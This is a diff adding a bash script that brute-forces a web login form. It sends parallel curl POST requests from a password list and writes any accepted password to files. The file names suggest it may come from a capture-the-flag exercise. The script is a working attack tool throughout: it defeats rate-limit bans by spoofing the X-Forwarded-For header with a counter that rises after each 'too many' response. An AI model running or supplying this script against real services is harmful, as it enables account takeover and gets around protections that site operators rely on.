@@ -1,0 +1,66 @@
+#!/usr/bin/bash
+
+username=$1
+passwords=$2
+url=$3
+threads=10
+flag="flag"
+
+rm -f "$flag"  # clean up any previous flag
+
+login() {
+    curl -s -o $5 -X POST -d "username=$1&password=$2" -H "X-Forwarded-For: $3" $4
+}
+
+running_jobs() {
+    jobs -rp | wc -l
+}
+
+attempt() {
+    tries=$3
+    while true; do
+        login $1 $2 $tries $4 "$2_response"
+        if cat $2_response | grep -q "too many"; then
+            tries=$(( tries + 1 ))
+            echo "[!] Banned: $tries"
+            continue
+        fi
+        if cat $2_response | grep -q "Invalid"; then
+            echo "Invalid: $2"
+            rm "$2_response"
+            break
+        fi
+        echo "Found: $1 : $2";
+        echo "$1: $2" > $flag
+        echo "$1: $2" > valid_password
+        rm -f "$2_response"
+        break
+    done
+}
+
+
+bypass=0
+
+for pass in $(cat "$passwords"); do
+    # Stop if flag is set
+    if [ -f "$flag" ]; then
+        break
+    fi
+
+    while [ "$(running_jobs)" -ge "$threads" ]; do
+        sleep 0.1
+        if [ -f "$flag" ]; then
+            break 2
+        fi
+    done
+    bypass=$(( bypass + 13 ))
+    attempt "$username" "$pass" "$bypass" $url &
+    
+done
+
+# Wait for all background jobs to finish
+wait
+
+# Final cleanup
+[ -f "$flag" ] && rm -f "$flag"
+exit 0
